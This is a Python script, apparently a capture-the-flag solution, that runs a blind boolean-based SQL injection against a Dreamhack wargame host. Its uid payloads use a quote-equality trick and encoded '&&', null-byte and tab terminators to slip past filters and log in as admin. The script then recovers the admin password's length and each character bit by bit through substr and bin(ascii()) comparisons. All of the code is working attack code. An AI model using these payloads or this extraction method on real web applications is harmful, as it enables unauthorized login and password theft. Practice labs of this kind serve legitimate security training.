import requests



def find_upw_length(URL):
    for i in range(1, 50):
        payload = f"?uid=abcde'='guest'%26%26length(uid)=5%26%26length(upw)={i};--%00"
        try:
            res = requests.get(URL+payload)
            print(f"[*] Injection: {URL+payload}")
            if("admin" in res.text):
                print(f"[+] Find upw length: {i}")
                return i

        except Exception as e:
            print(f"[-] Error find upw length: {str(e)}")
            exit(1)


def find_upw_bit_length(URL, upw_length):
    bit_length_list = []
    for i in range(1, upw_length+1):
        length = 0
        while(True):
            payload = f"?uid=abcde'='guest'%26%26length(uid)=5%26%26length(bin(ascii(substr(upw,{i},1))))={length};--%09"
            try:
                res = requests.get(URL+payload)
                if("admin" in res.text):
                    print(f"[+] find bit length!...")
                    bit_length_list.append(length)
                    break
                length += 1

            except Exception as e:
                print(f"[-] Error find upw bit length: {str(e)}")
                exit(1)

    print(f"[+] Find bit length {bit_length_list}")
    return bit_length_list

def find_upw_string(URL, upw_length, upw_bit_length):
    upw_string = ""
    for i in range(1, upw_length+1):
        bit_string = ""
        for j in range(1, upw_bit_length[i-1]+1):
            payload = f"?uid=abcde'='guest'%26%26length(upw)={upw_length}%26%26substr((bin(ascii(substr(upw,{i},1)))),{j},1)='1';--%09"
            try:
                res = requests.get(URL+payload)
                if("admin" in res.text):
                    bit_string += "1"
                
                else:
                    bit_string += "0"


            except Exception as e:
                print(f"[-] Error find upw string: {str(e)}")
                exit(1)

        bit_string = int(bit_string, 2)
        bit_string = chr(bit_string)
        upw_string += bit_string
        bit_string = ""
        print(f"[+] Find upw string: {upw_string}")
    return upw_string

        # byte_length = (i + 7) // 8
        # if len(bit_string) > byte_length * 8:
        #     bit_string = bit_string[-byte_length * 8:]


            

        # try:
        #     decoded_byte = int.to_bytes(int(bit_string, 2), byte_length, "big").decode("utf-8")
        #     upw_string += decoded_byte
        #     print(f"[+] find upw string: {upw_string}")
        # except OverflowError:
        #     print(f"OverflowError occurred for bit_string: {bit_string}")
    
    return upw_string




if __name__ == "__main__":
    URL = "http://host3.dreamhack.games:19554/"
    upw_length = find_upw_length(URL)
    upw_bit_length = find_upw_bit_length(URL, upw_length)
    print(find_upw_string(URL, upw_length, upw_bit_length))

